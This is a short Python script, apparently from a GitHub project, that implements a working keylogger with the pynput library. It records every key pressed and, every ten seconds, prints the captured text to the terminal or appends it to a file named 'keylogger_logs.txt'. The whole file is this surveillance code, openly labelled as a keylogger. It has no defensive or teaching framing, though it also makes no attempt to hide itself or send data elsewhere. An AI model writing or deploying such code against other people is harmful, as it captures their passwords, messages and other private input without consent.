#! /usr/bin/env python
# -*- coding: UTF-8 -*-

#github/async0

import argparse, threading, pynput.keyboard, os

if __name__ == "__main__":

    os.system("cat src/banner.txt")

    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--type', help="set option for dump logs", dest='type', required=True, \
                        choices=["terminal", "file"])
    args = parser.parse_args()

    chars = ""

    def methodone():
            global chars
            print(chars)
            chars = ""
            counter = threading.Timer(10, methodone)
            counter.start()

    def methodtwo():
            global chars
            file = open("keylogger_logs.txt", "a")
            file.write("\n " + chars)
            chars = ""
            counter = threading.Timer(10, methodtwo)
            counter.start()

    def dump(letter):
            global chars
            try:
                    chars += str(letter.char)
            except AttributeError:
                if letter == letter.space:
                        chars += " "
                else:
                        chars = chars + " " + str(letter) + " "
        
            print(chars)


    if args.type == "terminal":
        methodone()
    elif args.type == "file":
        methodtwo()
    else:
        print("Invalid value.")


    log = pynput.keyboard.Listener(on_press = dump)
    with log:
            log.join()